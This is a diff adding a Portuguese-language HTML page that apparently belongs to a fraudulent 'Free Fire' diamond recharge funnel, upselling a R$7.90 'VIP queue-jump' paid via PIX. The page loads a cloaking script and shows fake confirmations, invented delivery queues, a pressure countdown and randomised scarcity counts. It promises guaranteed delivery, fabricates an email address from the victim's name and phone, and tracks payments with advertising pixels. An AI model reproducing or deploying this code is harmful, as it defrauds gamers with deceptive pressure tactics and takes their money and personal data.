@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script src="/js/cloak.js"></script>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
+<title>Entrega Expressa VIP - Free Fire</title>
+<link rel="icon" href="images/iconff.png" type="image/png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--p:#FF6B00;--a:#7C3AED;--bg:#08050F;}
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{background:var(--bg);color:#fff;font-family:'Poppins',sans-serif;min-height:100vh;}
+img{max-width:100%;display:block;}
+button{cursor:pointer;font-family:inherit;}
+
+.amb{position:fixed;inset:0;z-index:0;overflow:hidden;pointer-events:none;}
+.amb::before,.amb::after{content:'';position:absolute;width:60vmax;height:60vmax;border-radius:50%;filter:blur(100px);opacity:.18;}
+.amb::before{background:radial-gradient(circle,#FF6B00,transparent 60%);top:-20vmax;left:-15vmax;animation:oA 20s ease-in-out infinite;}
+.amb::after{background:radial-gradient(circle,#7C3AED,transparent 60%);bottom:-20vmax;right:-15vmax;animation:oB 25s ease-in-out infinite;}
+@keyframes oA{0%,100%{transform:translate(0,0)}50%{transform:translate(8vmax,5vmax)}}
+@keyframes oB{0%,100%{transform:translate(0,0)}50%{transform:translate(-6vmax,-5vmax)}}
+
+.pw{max-width:480px;margin:0 auto;padding:0 0 60px;position:relative;z-index:1;}
+
+/* ── URGENCY TIMER HEADER ── */
+.timer-header{background:linear-gradient(135deg,rgba(220,38,38,.18),rgba(153,27,27,.10));border-bottom:2px solid rgba(220,38,38,.5);padding:14px 20px;text-align:center;position:relative;overflow:hidden;}
+.timer-header::after{content:'';position:absolute;inset:0;background:linear-gradient(90deg,transparent,rgba(220,38,38,.08),transparent);animation:scanline 2s linear infinite;}
+@keyframes scanline{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
+.timer-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(220,38,38,.2);border:1px solid rgba(220,38,38,.5);border-radius:20px;padding:4px 14px;margin-bottom:8px;}
+.timer-badge-dot{width:7px;height:7px;border-radius:50%;background:#ef4444;animation:blink 1s ease-in-out infinite;}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+.timer-badge-text{font-size:.65rem;font-weight:700;color:#ef4444;text-transform:uppercase;letter-spacing:.12em;}
+.timer-title{font-family:'Orbitron',sans-serif;font-size:1rem;font-weight:900;color:#fff;margin-bottom:6px;}
+.timer-title span{color:#ef4444;}
+.timer-row{display:flex;align-items:center;justify-content:center;gap:10px;}
+.timer-digit{background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.4);border-radius:8px;padding:4px 10px;min-width:46px;text-align:center;}
+.timer-num{font-family:'Orbitron',sans-serif;font-size:1.4rem;font-weight:900;color:#ef4444;line-height:1;}
+.timer-lbl{font-size:.52rem;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.1em;}
+.timer-sep{font-family:'Orbitron',sans-serif;font-size:1.3rem;font-weight:900;color:#ef4444;animation:blink 1s ease-in-out infinite;}
+
+/* ── CONFIRMED BANNER ── */
+.confirmed-bar{margin:14px 16px 0;background:linear-gradient(135deg,rgba(34,197,94,.12),rgba(22,163,74,.06));border:1px solid rgba(34,197,94,.3);border-radius:12px;padding:12px 16px;display:flex;align-items:center;gap:12px;}
+.confirmed-icon{font-size:1.6rem;flex-shrink:0;}
+.confirmed-body{flex:1;}
+.confirmed-title{font-size:.82rem;font-weight:700;color:#4ade80;margin-bottom:2px;}
+.confirmed-sub{font-size:.72rem;color:rgba(255,255,255,.55);line-height:1.4;}
+
+/* ── PROBLEM ALERT ── */
+.problem-box{margin:16px 16px 0;background:linear-gradient(145deg,rgba(234,179,8,.1),rgba(234,179,8,.04));border:1px solid rgba(234,179,8,.4);border-radius:14px;padding:18px;}
+.problem-header{display:flex;align-items:center;gap:10px;margin-bottom:12px;}
+.problem-icon{font-size:1.8rem;}
+.problem-title{font-family:'Orbitron',sans-serif;font-size:.88rem;font-weight:900;color:#fbbf24;letter-spacing:.04em;}
+.problem-text{font-size:.8rem;color:rgba(255,255,255,.72);line-height:1.7;margin-bottom:10px;}
+.problem-text strong{color:#fbbf24;}
+.queue-bar{margin-top:14px;}
+.queue-title{font-size:.7rem;font-weight:600;color:rgba(255,255,255,.45);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px;}
+.queue-row{display:flex;align-items:center;gap:10px;margin-bottom:6px;}
+.queue-label{font-size:.72rem;color:rgba(255,255,255,.55);width:110px;flex-shrink:0;}
+.queue-track{flex:1;height:6px;background:rgba(255,255,255,.08);border-radius:99px;overflow:hidden;}
+.queue-fill{height:100%;border-radius:99px;}
+.queue-fill.red{background:linear-gradient(90deg,#ef4444,#dc2626);width:92%;}
+.queue-fill.orange{background:linear-gradient(90deg,#f97316,#ea580c);width:78%;}
+.queue-fill.yellow{background:linear-gradient(90deg,#eab308,#ca8a04);width:65%;}
+.queue-val{font-family:'Orbitron',sans-serif;font-size:.65rem;font-weight:700;color:rgba(255,255,255,.45);width:30px;text-align:right;flex-shrink:0;}
+.eta-badge{margin-top:12px;background:rgba(220,38,38,.12);border:1px solid rgba(220,38,38,.35);border-radius:10px;padding:10px 14px;display:flex;align-items:center;gap:10px;}
+.eta-icon{font-size:1.2rem;}
+.eta-text{font-size:.76rem;color:rgba(255,255,255,.7);line-height:1.5;}
+.eta-text strong{color:#ef4444;}
+
+/* ── VIP OFFER BOX ── */
+.vip-box{margin:16px 16px 0;background:linear-gradient(145deg,rgba(255,215,0,.06),rgba(255,215,0,.02));border:2px solid rgba(255,215,0,.4);border-radius:16px;padding:18px;position:relative;overflow:hidden;}
+.vip-box::before{content:'⭐ OFERTA VIP EXCLUSIVA ⭐';position:absolute;top:0;left:0;right:0;background:linear-gradient(90deg,#FFD700,#FFA500,#FFD700);color:#000;font-family:'Orbitron',sans-serif;font-size:.6rem;font-weight:900;letter-spacing:.12em;text-align:center;padding:5px 0;background-size:200% 100%;animation:shimmer 2s linear infinite;}
+@keyframes shimmer{0%{background-position:0% 50%}100%{background-position:200% 50%}}
+.vip-content{margin-top:22px;}
+.vip-icon-row{text-align:center;font-size:2.8rem;margin-bottom:10px;}
+.vip-title{font-family:'Orbitron',sans-serif;font-size:1.1rem;font-weight:900;color:#FFD700;text-align:center;line-height:1.3;margin-bottom:8px;}
+.vip-subtitle{font-size:.8rem;color:rgba(255,255,255,.7);text-align:center;line-height:1.6;margin-bottom:16px;}
+.vip-features{display:flex;flex-direction:column;gap:8px;margin-bottom:16px;}
+.vip-feature{display:flex;align-items:center;gap:10px;background:rgba(255,215,0,.06);border:1px solid rgba(255,215,0,.2);border-radius:10px;padding:10px 14px;}
+.vip-feature-icon{font-size:1.2rem;flex-shrink:0;}
+.vip-feature-text{font-size:.78rem;color:rgba(255,255,255,.8);line-height:1.4;}
+.vip-feature-text strong{color:#FFD700;}
+.vip-price-row{text-align:center;margin-bottom:14px;}
+.vip-from{font-size:.72rem;color:rgba(255,255,255,.35);text-decoration:line-through;margin-bottom:2px;}
+.vip-price{font-family:'Orbitron',sans-serif;font-size:2rem;font-weight:900;color:#FFD700;line-height:1;}
+.vip-price span{font-size:.9rem;margin-right:2px;}
+.vip-price-sub{font-size:.68rem;color:rgba(255,255,255,.4);margin-top:4px;}
+.vip-spots{display:inline-flex;align-items:center;gap:6px;background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.35);border-radius:20px;padding:4px 12px;margin-bottom:14px;}
+.vip-spots-dot{width:6px;height:6px;border-radius:50%;background:#ef4444;animation:blink 1s ease-in-out infinite;}
+.vip-spots-text{font-size:.64rem;color:#ef4444;font-weight:700;letter-spacing:.06em;}
+
+/* ── CTA BUTTONS ── */
+.cta-sec{padding:16px 16px 0;}
+.cta-yes{display:block;width:100%;padding:18px;background:linear-gradient(135deg,#FFD700,#FFA500);color:#000;border:none;border-radius:13px;font-size:.92rem;font-weight:900;text-transform:uppercase;letter-spacing:.06em;box-shadow:0 8px 32px rgba(255,215,0,.45);font-family:'Orbitron',sans-serif;position:relative;overflow:hidden;animation:ctaPulse 2.5s ease-in-out infinite;margin-bottom:10px;}
+.cta-yes::after{content:'';position:absolute;top:0;left:-120%;width:60%;height:100%;background:linear-gradient(100deg,transparent,rgba(255,255,255,.5),transparent);transform:skewX(-20deg);animation:sh 2.5s ease-in-out infinite;}
+@keyframes sh{0%{left:-120%}55%,100%{left:160%}}
+@keyframes ctaPulse{0%,100%{transform:scale(1);}50%{transform:scale(1.018);}}
+.cta-yes:hover{box-shadow:0 12px 40px rgba(255,215,0,.65);}
+.cta-yes:disabled{opacity:.58;cursor:not-allowed;animation:none;}
+.cta-sub{text-align:center;font-size:.68rem;color:rgba(255,255,255,.35);margin-bottom:14px;}
+.cta-no{display:block;width:100%;padding:12px;background:transparent;border:1px solid rgba(255,255,255,.12);color:rgba(255,255,255,.3);border-radius:10px;font-size:.72rem;font-weight:500;text-align:center;transition:all .2s;}
+.cta-no:hover{color:rgba(255,255,255,.5);border-color:rgba(255,255,255,.2);}
+
+/* ── PIX AREA ── */
+.parea{display:none;margin-top:16px;padding:0 16px;}
+.parea.active{display:block;}
+.psuc{background:linear-gradient(135deg,rgba(255,215,0,.09),rgba(255,107,0,.09));border:1px solid rgba(255,215,0,.3);border-radius:13px;padding:14px;text-align:center;margin-bottom:14px;}
+.psuc-t{font-size:.95rem;font-weight:800;color:#FFD700;font-family:'Orbitron',sans-serif;}
+.psuc-s{font-size:.72rem;color:rgba(255,255,255,.55);margin-top:3px;}
+.pqr{background:#fff;border-radius:11px;padding:11px;display:inline-block;margin:10px auto;box-shadow:0 0 28px rgba(255,215,0,.25);text-align:center;}
+.pqr img{width:200px;height:200px;}
+.pcode{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.09);border-radius:7px;padding:10px;margin:0 0 10px;word-break:break-all;font-size:.62rem;color:rgba(255,255,255,.55);line-height:1.5;text-align:left;max-height:72px;overflow-y:auto;}
+.pcopy{display:block;width:100%;padding:13px;background:rgba(255,215,0,.09);border:2px solid #FFD700;color:#FFD700;border-radius:9px;font-size:.88rem;font-weight:700;transition:all .2s;}
+.pcopy:hover{background:rgba(255,215,0,.18);}
+.pcopy.copied{background:rgba(34,197,94,.18);border-color:#22c55e;color:#22c55e;}
+.pst{margin-top:10px;padding:11px;border-radius:9px;font-size:.78rem;font-weight:600;text-align:center;}
+.pst.pending{background:rgba(255,215,0,.07);border:1px solid rgba(255,215,0,.2);color:#FFD700;}
+.pst.paid{background:rgba(34,197,94,.09);border:1px solid rgba(34,197,94,.28);color:#22c55e;}
+</style>
+<script>
+window.pixelId="lt_px_dec55cf581b6";
+var a=document.createElement("script");a.setAttribute("async","");a.setAttribute("defer","");a.setAttribute("src","https://lowtrack.com.br/pixel.js");document.head.appendChild(a);
+</script>
+<script>(function(){var p=new URLSearchParams(window.location.search);['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','subid'].forEach(function(k){var v=p.get(k);if(v){sessionStorage.setItem(k,v);localStorage.setItem(k,v);}});})();</script>
+</head>
+<body>
+<div class="amb" aria-hidden="true"></div>
+<div class="pw">
+
+<!-- Timer Header -->
+<div class="timer-header">
+  <div class="timer-badge"><div class="timer-badge-dot"></div><span class="timer-badge-text">Oferta expira em</span></div>
+  <div class="timer-title">⚡ Essa oferta <span>desaparece</span> em:</div>
+  <div class="timer-row">
+    <div class="timer-digit"><div class="timer-num" id="tm-min">09</div><div class="timer-lbl">min</div></div>
+    <div class="timer-sep">:</div>
+    <div class="timer-digit"><div class="timer-num" id="tm-sec">59</div><div class="timer-lbl">seg</div></div>
+  </div>
+</div>
+
+<!-- Confirmed Banner -->
+<div class="confirmed-bar">
+  <div class="confirmed-icon">✅</div>
+  <div class="confirmed-body">
+    <div class="confirmed-title">Taxa de segurança confirmada!</div>
+    <div class="confirmed-sub">Seus diamantes estão sendo processados. Liberação em breve.</div>
+  </div>
+</div>
+
+<!-- Problem Alert -->
+<div class="problem-box">
+  <div class="problem-header">
+    <div class="problem-icon">⏳</div>
+    <div class="problem-title">FILA DE ENTREGA</div>
+  </div>
+  <p class="problem-text">
+    Devido ao <strong>altíssimo volume de recargas</strong> do evento <strong>FF x Naruto</strong>, 
+    o prazo de entrega padrão está com espera de até <strong>24 horas</strong>.
+  </p>
+
+  <div class="queue-bar">
+    <div class="queue-title">🔴 Status da fila agora:</div>
+    <div class="queue-row">
+      <div class="queue-label">Diamantes</div>
+      <div class="queue-track"><div class="queue-fill red"></div></div>
+      <div class="queue-val">92%</div>
+    </div>
+    <div class="queue-row">
+      <div class="queue-label">Passes e Eventos</div>
+      <div class="queue-track"><div class="queue-fill orange"></div></div>
+      <div class="queue-val">78%</div>
+    </div>
+    <div class="queue-row">
+      <div class="queue-label">Verificação</div>
+      <div class="queue-track"><div class="queue-fill yellow"></div></div>
+      <div class="queue-val">65%</div>
+    </div>
+  </div>
+
+  <div class="eta-badge">
+    <div class="eta-icon">🕐</div>
+    <div class="eta-text">Previsão de entrega sem VIP: <strong>18 a 24 horas</strong></div>
+  </div>
+</div>
+
+<!-- VIP Offer Box -->
+<div class="vip-box">
+  <div class="vip-content">
+    <div class="vip-icon-row">🚀</div>
+    <div class="vip-title">FURA-FILA VIP<br>ENTREGA EM 3 MINUTOS</div>
+    <div class="vip-subtitle">Ative o modo VIP e pule toda a fila. Seus diamantes chegam na conta <strong style="color:#FFD700;">em menos de 3 minutos</strong>, garantido.</div>
+    <div class="vip-features">
+      <div class="vip-feature">
+        <div class="vip-feature-icon">⚡</div>
+        <div class="vip-feature-text"><strong>Entrega Expressa Garantida</strong><br>Processamento prioritário em até 3 minutos</div>
+      </div>
+      <div class="vip-feature">
+        <div class="vip-feature-icon">🎯</div>
+        <div class="vip-feature-text"><strong>Fila VIP Exclusiva</strong><br>Seu pedido vai para o servidor dedicado, sem espera</div>
+      </div>
+      <div class="vip-feature">
+        <div class="vip-feature-icon">🛡️</div>
+        <div class="vip-feature-text"><strong>Garantia de Entrega</strong><br>Se não entregar em 3 min, reembolsamos 100%</div>
+      </div>
+    </div>
+    <div class="vip-price-row">
+      <div class="vip-from">De R$ 29,90</div>
+      <div class="vip-price"><span>R$</span>7,90</div>
+      <div class="vip-price-sub">taxa única de prioridade • apenas esta vez</div>
+    </div>
+    <div style="text-align:center;">
+      <div class="vip-spots"><div class="vip-spots-dot"></div><span class="vip-spots-text" id="spots-txt">⚠️ Apenas 3 vagas VIP disponíveis agora</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- CTA -->
+<div class="cta-sec">
+  <button class="cta-yes" id="cta-btn" onclick="gerarPix()">⚡ ATIVAR FURA-FILA VIP — R$ 7,90</button>
+  <div class="cta-sub">🔒 Pagamento seguro via PIX • Ativação instantânea</div>
+  <button class="cta-no" onclick="recusar()">Não, prefiro esperar 24h na fila normal</button>
+</div>
+
+<!-- PIX Area -->
+<div class="parea" id="pix-area">
+  <div class="psuc"><div class="psuc-t">⚡ VIP ATIVADO!</div><div class="psuc-s">Escaneie o QR Code ou copie o código abaixo</div></div>
+  <div style="text-align:center;"><div class="pqr"><img id="pix-qr-img" src="" alt="QR Code PIX VIP"></div></div>
+  <div class="pcode" id="pix-code-box"></div>
+  <button class="pcopy" id="pix-copy-btn" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
+  <div class="pst pending" id="pix-status">Aguardando ativação do modo VIP...</div>
+</div>
+
+</div><!-- /pw -->
+
+<script>
+// ── TIMER ──────────────────────────────────────────────────────────────
+(function(){
+  var total = 9 * 60 + 59;
+  function fmt(n){return n<10?'0'+n:String(n);}
+  function tick(){
+    var m = Math.floor(total/60), s = total%60;
+    document.getElementById('tm-min').textContent = fmt(m);
+    document.getElementById('tm-sec').textContent = fmt(s);
+    if(total > 0){ total--; setTimeout(tick, 1000); }
+    else{ document.getElementById('tm-min').textContent='00'; document.getElementById('tm-sec').textContent='00'; }
+  }
+  tick();
+})();
+
+// ── SPOTS (simulação dinâmica) ─────────────────────────────────────────
+(function(){
+  var spots = Math.floor(Math.random()*3) + 2; // 2 a 4
+  var el = document.getElementById('spots-txt');
+  if(el) el.textContent = '⚠️ Apenas '+spots+' vagas VIP disponíveis agora';
+})();
+
+// ── UTMs ──────────────────────────────────────────────────────────────
+function getUTMs(){
+  var keys=['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','subid'];
+  var params=new URLSearchParams(window.location.search);
+  var obj={};
+  keys.forEach(function(k){ obj[k]=params.get(k)||sessionStorage.getItem(k)||localStorage.getItem(k)||''; });
+  try{
+    var fbc=document.cookie.split('; ').find(function(r){return r.startsWith('_fbc=');});
+    if(fbc) obj.fbc=fbc.split('=')[1];
+    var fbp=document.cookie.split('; ').find(function(r){return r.startsWith('_fbp=');});
+    if(fbp) obj.fbp=fbp.split('=')[1];
+  }catch(e){}
+  return obj;
+}
+
+var pixCode='', txHash='', pollInterval=null;
+
+function gerarPix(){
+  var btn=document.getElementById('cta-btn');
+  btn.disabled=true; btn.textContent='Processando...';
+  var nome=localStorage.getItem('ff_nome')||sessionStorage.getItem('ff_nome')||'Ninja';
+  var tel=localStorage.getItem('ff_telefone')||sessionStorage.getItem('ff_telefone')||'11999999999';
+  var np=nome.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g,'').replace(/[^a-z0-9]/g,'');
+  var email=np+(tel.slice(-4)||'0000')+'@gmail.com';
+  var utms=getUTMs();
+
+  fetch('/api/create-pix',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      amount:'7.90',
+      nome:nome,email:email,telefone:tel,
+      product_title:'Fura-Fila VIP - Entrega Expressa FF',
+      plano:'vip_entrega',
+      utms:utms
+    })
+  })
+  .then(function(r){return r.json();})
+  .then(function(data){
+    var code=null;
+    if(data&&data.pix&&data.pix.pix_qr_code) code=data.pix.pix_qr_code;
+    else if(data&&data.pix&&data.pix.qrcode) code=data.pix.qrcode;
+    else if(data&&data.pix_qrcode) code=data.pix_qrcode;
+    else if(data&&data.data&&data.data.pix) code=data.data.pix.pix_qr_code||data.data.pix.qrcode;
+    txHash=data.hash||data.id||data.transaction_hash||(data.data&&(data.data.hash||data.data.id))||'';
+    if(!code){btn.disabled=false;btn.textContent='⚡ ATIVAR FURA-FILA VIP — R$ 7,90';alert('Erro ao gerar PIX. Tente novamente.');return;}
+    pixCode=code;
+    document.getElementById('cta-sec').style.display='none'; // esconde botões
+    document.getElementById('pix-area').classList.add('active');
+    document.getElementById('pix-qr-img').src='https://api.qrserver.com/v1/create-qr-code/?size=250x250&data='+encodeURIComponent(code);
+    document.getElementById('pix-code-box').textContent=code;
+    if(txHash){
+      startPolling();
+      // track-pending em background
+      fetch('/api/track-pending',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({txid:txHash,amount:'7.90',utms:utms,productTitle:'Fura-Fila VIP',nome:nome,email:email,telefone:tel})
+      }).catch(function(){});
+    }
+  })
+  .catch(function(err){btn.disabled=false;btn.textContent='⚡ ATIVAR FURA-FILA VIP — R$ 7,90';alert('Erro: '+err.message);});
+}
+
+function copiarPix(){
+  if(!pixCode)return;
+  var btn=document.getElementById('pix-copy-btn');
+  if(navigator.clipboard){
+    navigator.clipboard.writeText(pixCode).then(function(){
+      btn.textContent='✓ COPIADO!';btn.classList.add('copied');
+      setTimeout(function(){btn.textContent='COPIAR CÓDIGO PIX';btn.classList.remove('copied');},3000);
+    });
+  } else {
+    var ta=document.createElement('textarea');ta.value=pixCode;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);
+    btn.textContent='✓ COPIADO!';btn.classList.add('copied');
+    setTimeout(function(){btn.textContent='COPIAR CÓDIGO PIX';btn.classList.remove('copied');},3000);
+  }
+}
+
+function isPaid(d){
+  if(!d) return false;
+  if(d.status==='paid'||d.status==='approved') return true;
+  if(d.payment_status==='paid'||d.payment_status==='approved') return true;
+  return false;
+}
+
+function startPolling(){
+  pollInterval=setInterval(function(){
+    fetch('/api/check-tx?hash='+txHash)
+      .then(function(r){return r.json();})
+      .then(function(data){
+        if(isPaid(data)){
+          clearInterval(pollInterval);
+          var st=document.getElementById('pix-status');
+          st.className='pst paid';
+          st.textContent='⚡ ENTREGA VIP ATIVADA! Seus itens chegam em até 3 minutos!';
+          try{if(typeof fbq==='function')fbq('track','Purchase',{value:7.90,currency:'BRL'});}catch(e){}
+          setTimeout(function(){window.location.href='obrigado.html';},3000);
+        }
+      })
+      .catch(function(){});
+  },5000);
+}
+
+function recusar(){
+  window.location.href='obrigado.html';
+}
+</script>
+</body>
+</html>
